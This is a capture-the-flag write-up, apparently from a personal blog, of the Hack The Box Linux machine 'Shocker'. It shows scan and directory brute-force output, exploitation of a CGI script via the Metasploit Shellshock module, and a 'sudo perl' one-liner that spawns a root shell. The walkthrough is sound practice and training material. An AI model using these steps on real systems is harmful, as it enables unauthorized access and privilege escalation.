---
title:     "Hack The Box - Shocker"
tags: [linux,easy,sudo,shellshock]
layout: post
categories: HackTheBox OSCP-Machines
---

![](/img/htb-shocker/shocker1.png)

We are going to pwn Shocker from Hack The Box. It is Easy level linux machine.

Link : <https://www.hackthebox.eu/home/machines/profile/108>

Like always begin with our Nmap Scan.

## Enumeration
```bash
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 4.2 (95%), Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.8 - 3.11 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%), Linux 4.8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Check whats in the webpage<br/>
![](/img/htb-shocker/shocker2.png)

Like always lets try bruteforcing the webpage to find any interesting page.

## Gobuster Results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/02 21:00:28 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2019/12/02 21:04:36 Finished
===============================================================
```
> /cgi-bin  is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. 

## Checking ShellShock Exploit 

May be if we found any scripts available on ``/cgi-bin/`` we can do ``shellshock`` exploit as the name of the box ``Shocker`` gives us a clue.

Lets bruteforce `` /cgi-bin/ `` , I gave extensions as ``sh,py,pl`` to check for any scripts.

![](/img/htb-shocker/shocker3.png)

![](/img/htb-shocker/shocker4.png)

My guess is correct there is an ``user.sh`` script available

For more info
> https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/

## Getting Shell

There is a module for shellshock exploit, Lets fire up the metasploit

> use exploit/multi/http/apache_mod_cgi_bash_env_exec

We need to give the location of the script in ``TARGETURI`` 
![](/img/htb-shocker/shocker5.png)

![](/img/htb-shocker/shocker6.png)

Lets check first whether it is vulnerable or not!
It is Vulnerable so run this and we can get an shell.
![](/img/htb-shocker/shocker7.png)

We have an user called ``shelly``

## Privilege Escaltion

I did ``sudo -l`` and found that ``perl`` can run as root without password.
![](/img/htb-shocker/shocker8.png)

Lets check GTFOBins

>https://gtfobins.github.io/gtfobins/perl/

``sudo perl -e 'exec "/bin/sh";``

Running this command will make us root

![](/img/htb-shocker/shocker9.png)

We got ROOT ~
